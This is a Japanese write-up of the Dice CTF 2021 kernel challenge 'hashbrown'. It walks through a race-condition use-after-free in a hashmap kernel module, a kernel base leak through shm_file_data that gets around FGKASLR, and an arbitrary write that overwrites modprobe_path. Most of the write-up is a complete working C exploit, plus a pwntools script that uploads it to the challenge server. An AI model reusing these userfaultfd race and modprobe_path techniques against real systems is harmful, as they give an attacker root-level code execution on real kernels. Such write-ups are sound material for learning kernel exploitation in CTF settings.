keywords
kernel exploit, FGKASLR, slab, race condition, modprobe_path, shm_file_data, kUAF


# イントロ
いつぞや開催された**Dice CTF 2021**のkernel問題: **hashbrown**。なんかパット見でSECCON20のkvdbを思い出して吐きそうになった(あの問題、かなりbrainfuckingでトラウマ...)。まぁ結果として題材がハッシュマップを用いたデータ構造を使ってるっていうのと、結果としてdungling-pointerが生まれるということくらい(あれ、結構同じか？)。
先に言うと、凄くいい問題でした。自分にとって知らないこと(FGKASLRとか)を新しく知ることもできたし、既に知っていることを考えて使う練習もできた問題でした。


# static
## basic
```basic.sh
~ $ cat /proc/version
Linux version 5.11.0-rc3 (professor_stallman@i_use_arch_btw) (gcc (Debian 10.2.0-15) 10.2.0, GNU ld (GNU 1
~ $ lsmod
hashbrown 16384 0 - Live 0x0000000000000000 (OE)
$ modinfo ./hashbrown.ko
filename:       /home/wataru/Documents/ctf/dice2020/hashbrown/work/./hashbrown.ko
license:        GPL
description:    Here's a hashbrown for everyone!
author:         FizzBuzz101
depends:
retpoline:      Y
name:           hashbrown
vermagic:       5.11.0-rc3 SMP mod_unload modversions

exec qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel "bzImage" \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
    -no-reboot \
    -cpu qemu64,+smep,+smap \
    -monitor /dev/null \
    -initrd "initramfs.cpio" \
    -smp 2 \
    -smp cores=2 \
    -smp threads=1

```
SMEP有効・SMAP有効・KAISER有効・KASLR有効・**FGKASLR**有効・oops->panic・ダブルコアSMP
スラブには*SLUB*ではなく*SLAB*を利用していて、*CONFIG_FREELIST_RANDOM*と*CONFIG_FREELIST_HARDENED*有効。

## Module
モジュール*hashbrown*のソースコードが配布されている。ソースコードの配布はいつだって正義。配布しない場合はその理由を原稿用紙12枚分書いて一緒に配布する必要がある。
キャラクタデバイス */dev/hashbrown* を登録し、 *ioctl()* のみを実装している。その挙動は典型的なhashmapの実装であり、[author's writeup](https://www.willsroot.io/2021/02/dicectf-2021-hashbrown-writeup-from.html)によるとJDKの実装を取ってきているらしい。`ioctl()`の概観は以下のとおり。
```hashbrown_distributed.c
static long hashmap_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    long result;
    request_t request;
    uint32_t idx;

    if (cmd == ADD_KEY)
    {
        if (hashmap.entry_count == hashmap.threshold && hashmap.size < SIZE_ARR_MAX)
        {
            mutex_lock(&resize_lock);
            result = resize((request_t *)arg);
            mutex_unlock(&resize_lock);
            return result;
        }
    }

    mutex_lock(&operations_lock);
    if (copy_from_user((void *)&request, (void *)arg, sizeof(request_t)))
    {
        result = INVALID;
    }
    else if (cmd == ADD_KEY && hashmap.entry_count == MAX_ENTRIES)
    {
        result = MAXED;
    }
    else
    {
        idx = get_hash_idx(request.key, hashmap.size);
        switch(cmd)
        {
            case ADD_KEY:
                result = add_key(idx, request.key, request.size, request.src);
                break;
            case DELETE_KEY:
                result = delete_key(idx, request.key);
                break;
            case UPDATE_VALUE:
                result = update_value(idx, request.key, request.size, request.src);
                break;
            case DELETE_VALUE:
                result = delete_value(idx, request.key);
                break;
            case GET_VALUE:
                result = get_value(idx, request.key, request.size, request.dest);
                break;
            default:
                result = INVALID;
                break;
        }
    }
    mutex_unlock(&operations_lock);
    return result;
}
```
データは`struct hashmap_t`型の構造体で管理され、各エントリは`struct hash_entry`型で表現される。
```structs.c
typedef struct
{
    uint32_t size;
    uint32_t threshold;
    uint32_t entry_count;
    hash_entry **buckets;
}hashmap_t;
```
`buckets`の大きさは`size`だけあり、キーを新たに追加する際に現在存在しているキーの数が`threshold`を上回っていると`resize()`が呼び出され、新たに`buckets`が`kzalloc()`で確保される。古い`buckets`からデータをすべてコピーした後、古い`buckets`は`kfree()`される。この`threshold`は、*bucketsが保持可能な最大要素数 x 3/4*で計算される。各`buckets`へのアクセスには`key`の値から計算したインデックスを用いて行われ、このインデックスは容易に衝突するため`hash_entry`はリスト構造で要素を保持している。


# FGKASLR
**Finer/Function Granular KASLR**。詳しくは[LWN](https://lwn.net/Articles/824307/)参照。カーネルイメージELFに関数毎にセクションが作られ、それらがカーネルのロード時にランダマイズされて配置されるようになる。メインラインには載っていない。これによって、あるシンボルをleakすることでベースとなるアドレスを計算することが難しくなる。
```ex.sh
       0000000000000094  0000000000000000  AX       0     0     16
  [3507] .text.revert_cred PROGBITS         ffffffff8148e2b0  0068e2b0
       000000000000002f  0000000000000000  AX       0     0     16
  [3508] .text.abort_creds PROGBITS         ffffffff8148e2e0  0068e2e0
       000000000000001d  0000000000000000  AX       0     0     16
  [3509] .text.prepare_cre PROGBITS         ffffffff8148e300  0068e300
       0000000000000234  0000000000000000  AX       0     0     16
  [3510] .text.commit_cred PROGBITS         ffffffff8148e540  0068e540
       000000000000019c  0000000000000000  AX       0     0     16
  [3511] .text.prepare_ker PROGBITS         ffffffff8148e6e0  0068e6e0
       00000000000001ba  0000000000000000  AX       0     0     16
  [3512] .text.exit_creds  PROGBITS         ffffffff8148e8a0  0068e8a0
       0000000000000050  0000000000000000  AX       0     0     16
  [3513] .text.cred_alloc_ PROGBITS         ffffffff8148e8f0  0068e8f0
```
なんか、こうまでするのって、凄いと思うと同時に、ちょっと引く...。

朗報として、従来の *.text* セクションに入っている一部の関数及びC以外で記述された関数はランダマイズの対象外になる。また、データセクションにあるシンボルもランダマイズされないため、リークにはこういったシンボルを使う。詳しくは後述する。


# Vuln: race to kUAF
モジュールは結構ちゃんとした実装になっている。だが、上のコード引用からも分かるとおり、ミューテックスを2つ利用していることが明らかに不自然。しかも、*basic*に書いたようにマルチコアで動いているため**race condition**であろうことが推測できる。そして、大抵の場合raceはCTFにおいて`copy_from_user()`を呼び出すパスで起きることが多い(かなりメタ読みだが、そうするとuffdが使えるため)。
それを踏まえて`resize()`を見てみると、以下の順序で`buckets`のresizeを行っていることが分かる。
```resize.txt
1. 新しいbucketsをkzalloc()
2. 古いbucketsの各要素を巡回し、各要素を新たにkzalloc()してコピー
3. 新たに追加する要素をkzalloc()して追加。古い要素が持ってるデータへのポインタを新しい要素にコピー。
4. 古いbucketsの要素を全てkfree()
```
ここで、手順3において新たに追加する要素の追加に`copy_from_user()`が使われている。よって、**userfaultfd**によって一旦処理を3で停止させる。その間に、*DELETE_VALUE*によって値を削除する。すると、実際にその値は`kfree()`されるものの、ポインタがNULLクリアされるのは古い方の`buckets`のみであり、新しい方の`buckets`には削除されたポインタが残存することになる(*dungling-pointer*)。
```hashbrown_distributed.c
static long delete_value(uint32_t idx, uint32_t key)
{
    hash_entry *temp;
    if (!hashmap.buckets[idx])
    {
        return NOT_EXISTS;
    }
    for (temp = hashmap.buckets[idx]; temp != NULL; temp = temp->next)
    {
        if (temp->key == key)
        {
            if (!temp->value || !temp->size)
            {
                return NOT_EXISTS;
            }
            kfree(temp->value);
            temp->value = NULL;
            temp->size = 0;
            return 0;
        }
    }
    return NOT_EXISTS;
}
```
上の`hashmap`はuffdによって`resize()`処理が停止されている間は古い`buckets`を保持することになるから、UAFの成立である。


# leak and bypass FGKASLR via shm_file_data
さて、上述したUAFを用いてまずはkernbaseのleakをする。

## なんでseq_operationsじゃだめなのか
[参考4](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)において、*kmalloc-32*で利用できる構造体に`shm_file_data`がある。これは以下のように定義される構造体である。
```ipc/shm.c
struct shm_file_data {
	int id;
	struct ipc_namespace *ns;
	struct file *file;
	const struct vm_operations_struct *vm_ops;
};
```
メンバの内、`ns`と`vm_ops`がデータセクションのアドレスを指している。また、`file`はヒープアドレスを指している。共有メモリをallocすることで任意のタイミングで確保・ストックすることができ、kernbaseもkernheapもleakできる優れものである。

とりわけ、`vm_ops`は`shmem_vm_ops`を指している。`shmem_vm_ops`は以下で定義される`struct vm_operations_struct`型の静的変数である。
```mm/shmem.c
static const struct vm_operations_struct shmem_vm_ops = {
	.fault		= shmem_fault,
	.map_pages	= filemap_map_pages,
#ifdef CONFIG_NUMA
	.set_policy     = shmem_set_policy,
	.get_policy     = shmem_get_policy,
#endif
};
```
`shmat`の呼び出しによって呼ばれる`shm_mmap()`の内部で以下のように代入される。
```ipc/shm.c
static int shm_mmap(struct file *file, struct vm_area_struct *vma)
{
	struct shm_file_data *sfd = shm_file_data(file);
    (snipped...)
	sfd->vm_ops = vma->vm_ops;
#ifdef CONFIG_MMU
	WARN_ON(!sfd->vm_ops->fault);
#endif
	vma->vm_ops = &shm_vm_ops;
	return 0;
}
```
参考までに、以下が上のコードまでのbacktrace。(v5.9.11)
```bt.sh
#0  shm_mmap (file=<optimized out>, vma=0xffff88800e4710c0) at ipc/shm.c:508
#1  0xffffffff8118c5c6 in call_mmap (vma=<optimized out>, file=<optimized out>) at ./include/linux/fs.h:1887
#2  mmap_region (file=<optimized out>, addr=140174097555456, len=<optimized out>, vm_flags=<optimized out>, pgoff=<optimized out>, uf=<optimized out>) at mm/mmap.c:1773
#3  0xffffffff8118cb9e in do_mmap (file=0xffff88800e42a600, addr=<optimized out>, len=4096, prot=2, flags=1, pgoff=<optimized out>, populate=0xffffc90000157ee8, uf=0x0) at mm/mmap.c:1545
#4  0xffffffff81325012 in do_shmat (shmid=1, shmaddr=<optimized out>, shmflg=0, raddr=<optimized out>, shmlba=<optimized out>) at ipc/shm.c:1559
#5  0xffffffff813250be in __do_sys_shmat (shmflg=<optimized out>, shmaddr=<optimized out>, shmid=<optimized out>) at ipc/shm.c:1594
#6  __se_sys_shmat (shmflg=<optimized out>, shmaddr=<optimized out>, shmid=<optimized out>) at ipc/shm.c:1589
#7  __x64_sys_shmat (regs=<optimized out>) at ipc/shm.c:1589
#8  0xffffffff81a3feb3 in do_syscall_64 (nr=<optimized out>, regs=0xffffc90000157f58) at arch/x86/entry/common.c:46
```

*kmalloc-32*で使える構造体であれば、`seq_operations`もあると[書いてある](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)が、これらのポインタはFGKASLRの影響を受ける。実際、`single_start()`等の関数のためにセクションが設けられていることが分かる。
```readelf.txt
  [11877] .text.single_star PROGBITS         ffffffff81669b30  00869b30
       000000000000000f  0000000000000000  AX       0     0     16
  [11878] .text.single_next PROGBITS         ffffffff81669b40  00869b40
       000000000000000c  0000000000000000  AX       0     0     16
  [11879] .text.single_stop PROGBITS         ffffffff81669b50  00869b50
       0000000000000006  0000000000000000  AX       0     0     16
```
よって、*kernbase*のleakにはこういった関数ポインタではなく、データ領域を指している`shm_file_data`等を使うことが望ましい。

## leak
といわけで、uffdを使ってraceを安定化させつつ`shm_file_data`でkernbaseをリークしていく。
まずは`buckets`が拡張される直前まで`key`を追加していく。最初の`threshold`は*0x10 x 3/4 = 0xc*回であるから、その分だけ`add_key()`。それが終わったらuffdを設定したページからさらに`add_key()`を行い、フォルトの発生中に`delete_value()`して要素を解放したらUAFの完成。以下のようにleakができる。
![](https://i.imgur.com/klr5nr9.png)

## 因みに
uffdハンドラの中で`mmap()`するのって、rootじゃないとダメなんだっけ？以下のコードはrootでやると上手く動いたけど、rootじゃないと`mmap()`で-1が返ってきちゃった。後で調べる。
```fail.c
    void *srcpage = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    printf("[+] mmapped @ %p\n", srcpage);
    uffdio_copy.src = (ulong)srcpage;
    uffdio_copy.dst = (ulong)msg.arg.pagefault.address & ~(PAGE - 1);
    uffdio_copy.len = PAGE;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
      errExit("ioctl-UFFDIO_COPY");
```
【追記 20200215】これ、単純にアドレス0x0に対して`MAP_FIXED`にしてるからだわ。


# AAW
# principle
さて、ここまででkernbaseのleakができている。次はAAWが欲しい。あと50兆円欲しい。
本モジュールには、既に存在している`hash_entry`の値を更新する`update_value`という操作がある。
```update_value.c
static long update_value(uint32_t idx, uint32_t key, uint32_t size, char *src)
{
    hash_entry *temp;
    char *temp_data;

    if (size < 1 || size > MAX_VALUE_SIZE)
    {
        return INVALID;
    }
    if (!hashmap.buckets[idx])
    {
        return NOT_EXISTS;
    }

    for (temp = hashmap.buckets[idx]; temp != NULL; temp = temp->next)
    {
        if (temp->key == key)
        {
            if (temp->size != size)
            {
                if (temp->value)
                {
                    kfree(temp->value);
                }
                temp->value = NULL;
                temp->size = 0;
                temp_data = kzalloc(size, GFP_KERNEL);
                if (!temp_data || copy_from_user(temp_data, src, size))
                {
                    return INVALID;
                }
                temp->size = size;
                temp->value = temp_data;
            }
            else
            {
                if (copy_from_user(temp->value, src, size))
                {
                    return INVALID;
                }
            }
            return 0;
        }
    }
    return NOT_EXISTS;
}
```
この中の`if (copy_from_user(temp->value, src, size))`の部分で、仮に`temp->value`の保持するアドレスが不正に書き換えられるとするとAAWになる。この`temp`は`struct hash_entry`型であり、このサイズは*kmalloc-32*である。よって、先程までと全く同じ方法でkUAFを起こし、`temp`の中身を自由に操作することができる。
因みに、leakしたあとすぐに再び*threshold*分だけ`add_key()`して`resize()`を呼ばせて、kUAFを起こし、そのあとすぐに`add_key()`して目的のobjectを手に入れようとしたが手に入らなくて"？？？"になった。だが、よくよく考えたら`delete_value()`でkUAFを引き起こした後に、古い`buckets`の解放が起こるためスラブにはどんどんオブジェクトが蓄積していってしまう。よって、その状態で目的のkUAFされたオブジェクトを手に入ろうとしてもすぐには手に入らない。解決方法は単純で、削除したはずの要素から`get_value()`し続けて、それが今まで入っていた値と異なる瞬間が来たら、そのobjectが新たに`hash_entry`としてallocされたことになる。
```find-my-object.c
  for(int ix=threshold+1; 1==1; ++ix){ // find my cute object
    memset(buf, 'A', 0x20);
    add_key(hashfd, ix, 0x20, buf);
    get_value(hashfd, targetkey, 0x20, buf);
    if(((uint*)buf)[0] != 0x41414141){
      printf("[!] GOT kUAFed object!\n");;
      printf("[!] %lx\n", ((ulong*)buf)[0]);
      printf("[!] %lx\n", ((ulong*)buf)[1]);
      printf("[!] %lx\n", ((ulong*)buf)[2]);
      printf("[!] %lx\n", ((ulong*)buf)[3]);
      break;
    }
  }
```


# overwrite modprobe_path
今回はSMAP/SMEP有効だから、ユーザランドのシェルコードを実行させるということはできない。かといってROPを組もうにも、FGKASLRが有効であるからガジェットの位置が定まらない。こんなときは、定番の**modprobe_path**の書き換えを行う。`modprobe_path`はデータセクションにあるためFGKASLRの影響を受ける心配もない。
以下の感じで、ぷいぷいもるかー。
```modprobe_path_nirugiri.c
  // trigger modprobe_path
  system("echo -ne '#!/bin/sh\n/bin/cp /flag.txt /home/ctf/flag.txt\n/bin/chmod 777 /home/ctf/flag.txt' > /home/ctf/nirugiri.sh");
  system("chmod +x /home/ctf/nirugiri.sh");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/puipui-molcar");
  system("chmod +x /home/ctf/puipui-molcar");
  system("/home/ctf/puipui-molcar");

  // NIRUGIRI it
  system("cat /home/ctf/flag.txt");
```



# exploit
```exploit.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


// commands
#define DEV_PATH "/dev/hashbrown"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

// consts
#define SIZE_ARR_START 0x10

// globals
#define STATE_LEAK 0
#define STATE_UAF 1
#define STATE_INVALID 99
void *uffdaddr = NULL;
pthread_t uffdthr; // ID of thread that handles page fault and continue exploit in another kernel thread
int hashfd = -1;
uint STATUS = STATE_LEAK;
uint targetkey = SIZE_ARR_START * 3 / 4 - 1;
uint limit = SIZE_ARR_START;
uint threshold = SIZE_ARR_START * 3/ 4;
char *faultsrc = NULL;
// (END globals)

/*** hashbrown ****/
// commands
#define ADD_KEY 0x1337
#define DELETE_KEY 0x1338
#define UPDATE_VALUE 0x1339
#define DELETE_VALUE 0x133a
#define GET_VALUE 0x133b
// returns
#define INVALID 1
#define EXISTS 2
#define NOT_EXISTS 3
#define MAXED 4

// structs
typedef struct{
    uint32_t key;
    uint32_t size;
    char *src;
    char *dest;
}request_t;
struct hash_entry{
    uint32_t key;
    uint32_t size;
    char *value;
    struct hash_entry *next;
};
typedef struct
{
    uint32_t size;
    uint32_t threshold;
    uint32_t entry_count;
    struct hash_entry **buckets;
}hashmap_t;
uint get_hash_idx(uint key, uint size)
{
    uint hash;
    key ^= (key >> 20) ^ (key >> 12);
    hash = key ^ (key >> 7) ^ (key >> 4);
    return hash & (size - 1);
}

// wrappers
void add_key(int fd, uint key, uint size, char *data){
  printf("[+] add_key: %d %d %p\n", key, size, data);
  request_t req = {
    .key = key,
    .size = size,
    .src = data
  };
  long ret = ioctl(fd, ADD_KEY, &req);
  assert(ret != INVALID && ret != EXISTS);
}
void delete_key(int fd, uint key){
  printf("[+] delete_key: %d\n", key);
  request_t req = {
    .key = key
  };
  long ret = ioctl(fd, DELETE_KEY, &req);
  assert(ret != NOT_EXISTS && ret != INVALID);
}
void update_value(int fd, uint key, uint size, char *data){
  printf("[+] update_value: %d %d %p\n", key, size, data);
  request_t req = {
    .key = key,
    .size = size,
    .src = data
  };
  long ret = ioctl(fd, UPDATE_VALUE, &req);
  assert(ret != INVALID && ret != NOT_EXISTS);
}
void delete_value(int fd, uint key){
  printf("[+] delete_value: %d\n", key);
  request_t req = {
    .key = key,
  };
  long ret = ioctl(fd, DELETE_VALUE, &req);
  assert(ret != NOT_EXISTS);
}
void get_value(int fd, uint key, uint size, char *buf){
  printf("[+] get_value: %d %d %p\n", key, size, buf);
  request_t req = {
    .key = key,
    .size = size,
    .dest = buf
  };
  long ret = ioctl(fd, GET_VALUE, &req);
  assert(ret != NOT_EXISTS && ret != INVALID);
}

/**** (END hashbrown) ****/

// userfaultfd-utils
static void* fault_handler_thread(void *arg)
{
  puts("[+] entered fault_handler_thread");

  static struct uffd_msg msg;   // data read from userfaultfd
  struct uffdio_copy uffdio_copy;
  long uffd = (long)arg;        // userfaultfd file descriptor
  struct pollfd pollfd;         //
  int nready;                   // number of polled events
  int shmid;
  void *shmaddr;

  // set poll information
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  // wait for poll
  puts("[+] polling...");
  while(poll(&pollfd, 1, -1) > 0){
    if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      errExit("poll");

    // read an event
    if(read(uffd, &msg, sizeof(msg)) == 0)
      errExit("read");

    if(msg.event != UFFD_EVENT_PAGEFAULT)
      errExit("unexpected pagefault");

    printf("[!] page fault: 0x%llx\n",msg.arg.pagefault.address);

    // Now, another thread is halting. Do my business.
    switch(STATUS){
      case STATE_LEAK:
        if((shmid = shmget(IPC_PRIVATE, PAGE, 0600)) < 0)
          errExit("shmget");
        delete_value(hashfd, targetkey);
        if((shmaddr = shmat(shmid, NULL, 0)) < 0)
          errExit("shmat");
        STATUS = STATE_UAF;
        break;
      case STATE_UAF:
        delete_value(hashfd, targetkey);
        STATUS = STATE_INVALID;
        break;
      default:
        errExit("unknown status");
    }

    printf("[+] uffdio_copy.src: %p\n", faultsrc);
    uffdio_copy.src = (ulong)faultsrc;
    uffdio_copy.dst = (ulong)msg.arg.pagefault.address & ~(PAGE - 1);
    uffdio_copy.len = PAGE;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
      errExit("ioctl-UFFDIO_COPY");
    else{
      puts("[+] end ioctl(UFFDIO_COPY)");
    }

    break;
  }

  puts("[+] exiting fault_handler_thrd");
}

pthread_t register_userfaultfd_and_halt(void)
{
  puts("[+] registering userfaultfd...");

  long uffd;      // userfaultfd file descriptor
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  // create userfaultfd file descriptor
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // there is no wrapper in libc
  if(uffd == -1)
    errExit("userfaultfd");

  // enable uffd object via ioctl(UFFDIO_API)
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    errExit("ioctl-UFFDIO_API");

  // mmap
  puts("[+] mmapping...");
  uffdaddr = mmap((void*)FAULT_ADDR, PAGE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
  printf("[+] mmapped @ %p\n", uffdaddr);
  if(uffdaddr == MAP_FAILED)
    errExit("mmap");

  // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
  uffdio_register.range.start = (ulong)uffdaddr;
  uffdio_register.range.len = PAGE;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    errExit("ioctl-UFFDIO_REGISTER");

  s = pthread_create(&uffdthr, NULL, fault_handler_thread, (void*)uffd);
  if(s!=0){
    errno = s;
    errExit("pthread_create");
  }

  puts("[+] registered userfaultfd");
  return uffdthr;
}
// (END userfaultfd-utils)

/******** MAIN ******************/

int main(int argc, char *argv[]) {
  char buf[0x200];
  faultsrc = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  memset(buf, 0, 0x200);
  hashfd = open(DEV_PATH, O_RDONLY);
  assert(hashfd > 0);

  // race-1: leak via shm_file_data
  for(int ix=0; ix!=threshold; ++ix){
    add_key(hashfd, ix, 0x20, buf);
  }
  register_userfaultfd_and_halt();
  add_key(hashfd, threshold, 0x20, uffdaddr);
  limit <<= 2;
  threshold = limit * 3 / 4;
  pthread_join(uffdthr, 0);

  // leak kernbase
  get_value(hashfd, targetkey, 0x20, buf);
  printf("[!] %lx\n", ((ulong*)buf)[0]);
  printf("[!] %lx\n", ((ulong*)buf)[1]);
  printf("[!] %lx\n", ((ulong*)buf)[2]);
  printf("[!] %lx: shmem_vm_ops\n", ((ulong*)buf)[3]);
  const ulong shmem_vm_ops = ((ulong*)buf)[3];
  const ulong kernbase = shmem_vm_ops - ((ulong)0xffffffff8b622b80 - (ulong)0xffffffff8ae00000);
  const ulong modprobe_path = kernbase + ((ulong)0xffffffffb0c46fe0 - (ulong)0xffffffffb0200000);
  printf("[!] kernbase: 0x%lx\n", kernbase);
  printf("[!] modprobe_path: 0x%lx\n", modprobe_path);

  // race-2: retrieve hash_entry as value
  targetkey = threshold - 1;
  memset(buf, 'A', 0x20);
  for(int ix=SIZE_ARR_START * 3/4 + 1; ix!=threshold; ++ix){
    add_key(hashfd, ix, 0x20, buf);
  }
  register_userfaultfd_and_halt();
  add_key(hashfd, threshold, 0x20, uffdaddr);
  pthread_join(uffdthr, 0);
  for(int ix=threshold+1; 1==1; ++ix){ // find my cute object
    memset(buf, 'A', 0x20);
    add_key(hashfd, ix, 0x20, buf);
    get_value(hashfd, targetkey, 0x20, buf);
    if(((uint*)buf)[0] != 0x41414141){
      printf("[!] GOT kUAFed object!\n");;
      printf("[!] %lx\n", ((ulong*)buf)[0]);
      printf("[!] %lx\n", ((ulong*)buf)[1]);
      printf("[!] %lx\n", ((ulong*)buf)[2]);
      printf("[!] %lx\n", ((ulong*)buf)[3]);
      break;
    }
  }

  // forge hash_entry as data and overwrite modprobe_path
  struct hash_entry victim = {
    .key = ((uint*)buf)[0],
    .size = ((uint*)buf)[1],
    .value = modprobe_path,
    .next = NULL
  };
  update_value(hashfd, targetkey, 0x20, &victim);
  update_value(hashfd, ((uint*)buf)[0], 0x20, "/home/ctf/nirugiri.sh\x00\x00\x00\x00");

  // trigger modprobe_path
  system("echo -ne '#!/bin/sh\n/bin/cp /flag.txt /home/ctf/flag.txt\n/bin/chmod 777 /home/ctf/flag.txt' > /home/ctf/nirugiri.sh");
  system("chmod +x /home/ctf/nirugiri.sh");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/puipui-molcar");
  system("chmod +x /home/ctf/puipui-molcar");
  system("/home/ctf/puipui-molcar");

  // NIRUGIRI it
  system("cat /home/ctf/flag.txt");

  return 0;
}
```

今回はまだ問題サーバが生きていたからsenderも。
```sender.py
#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./exploit"
LIBCNAME = ""

hosts = ("dicec.tf","localhost","localhost")
ports = (31691,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  global c
  pass

## exploit ###########################################

def exploit():
  c.recvuntil("Send the output of: ")
  hashcat = c.recvline().rstrip().decode('utf-8')
  print("[+] calculating PoW...")
  hash_res = os.popen(hashcat).read()
  print("[+] finished calc hash: " + hash_res)
  c.sendline(hash_res)

  with open("./exploit.b64", 'r') as f:
    binary = f.read()
  
  progress = 0
  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
  for s in [binary[i: i+0x80] for i in range(0, len(binary), 0x80)]:
    c.sendlineafter('$', 'echo {} >> exploit.b64'.format(s))
    progress += 0x80
    if progress % 0x1000 == 0:
      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
  c.sendlineafter('$', 'base64 -d exploit.b64 > exploit')



## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
```

# アウトロ
![](https://i.imgur.com/Lj1v27S.png)


いい問題。大切な要素が詰まってるし、難易度も簡単すぎず難しすぎず。
おいしかったです。やよい軒行ってきます。

# symbols without KASLR
```symbols.txt
hashmap: 0xffffffffc0002540
kmalloc_caches: 0xffffffff81981dc0
__per_cpu_offset: 0xffffffff81980680
```
FGKASLRのせいでモジュール内の関数にブレーク貼れないのマジでストレスで胃が爆発霧散するかと思った(`nokaslr`指定しても無駄だし... :cry:)。まぁ起動する度に確認すれば良いんだけど。


# 参考
author's writeup
https://www.willsroot.io/2021/02/dicectf-2021-hashbrown-writeup-from.html
LWN about FGKASLR
https://lwn.net/Articles/824307/
pwn chall in HXPCTF also using FGKASLR
https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/
kernel structure refs
https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628
しふくろさんのブログ(modprobe_pathについて参考にした)
https://shift-crops.hatenablog.com/entry/2019/04/30/131154
